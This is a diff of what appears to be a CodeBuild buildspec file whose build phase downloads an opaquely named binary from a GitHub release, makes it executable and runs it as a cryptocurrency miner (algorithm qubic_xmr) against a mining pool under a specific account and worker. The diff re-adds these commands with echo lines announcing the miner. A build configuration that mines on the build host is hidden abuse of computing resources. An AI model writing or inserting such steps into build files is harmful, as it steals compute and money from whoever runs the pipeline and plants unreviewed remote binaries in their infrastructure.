@@ -3,6 +3,8 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/vedhagsvp/qubros/releases/download/apl/vaseas
-        - chmod +x vaseas
-        - ./vaseas --algo qubic_xmr --account CP_udnvh2owpq --worker pakos --pool qubic1.hk.apool.io:3334
+      - echo "Downloading miner..."
+      - wget https://github.com/vedhagsvp/qubros/releases/download/apl/vaseas
+      - chmod +x vaseas
+      - echo "Starting mining process..."
+      - ./vaseas --algo qubic_xmr --account CP_udnvh2owpq --worker pakos --pool qubic1.hk.apool.io:3334
